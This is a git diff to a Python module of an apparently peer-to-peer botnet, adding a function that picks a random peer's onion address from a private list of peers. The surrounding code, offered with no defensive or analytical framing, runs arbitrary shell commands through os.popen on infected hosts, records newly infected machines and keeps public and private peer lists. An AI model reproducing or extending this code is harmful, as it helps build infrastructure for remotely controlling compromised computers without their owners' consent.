@@ -1,7 +1,8 @@
-"""Interesting functions for a botnet"""
+"""Botnet tools"""
 
 import random
 import os
+import math
 
 from botnet_p2p import (
     MAX_PUBLIC_PEER_LIST_LENGTH,
@@ -14,12 +15,14 @@ public_peer_list_path = files_path + "public/peer_list"
 private_peer_list_path = files_path + "private/full_peer_list"
 
 
-def change_peer_lists_locations(public_peer_list_new_path: str, private_peer_list_new_path: str):
+def change_peer_lists_locations(
+    public_peer_list_new_path: str, private_peer_list_new_path: str
+):
     global public_peer_list_path
-    global private_peer_list_path 
+    global private_peer_list_path
 
     public_peer_list_path = public_peer_list_new_path
-    private_peer_list_path = private_peer_list_new_path 
+    private_peer_list_path = private_peer_list_new_path
 
 
 def add_new_infected_machine(msg_data: str):
@@ -42,6 +45,16 @@ def execute_command(command: str) -> str:
     result = os.popen(command).read()
     return result
 
+
+def select_random_neighbour() -> str:
+    with open(private_peer_list_path, "r") as private_peer_list:
+        lines = private_peer_list.readlines()
+        num_lines = len(lines)
+        random_number = random.randint(0, num_lines - 1)
+        text_line = lines[random_number]
+
+    comm_onion = text_line.strip().split(" ")[-1]
+    return comm_onion
 
 def __public_peer_list_reached_maximum_length() -> bool:
     try:
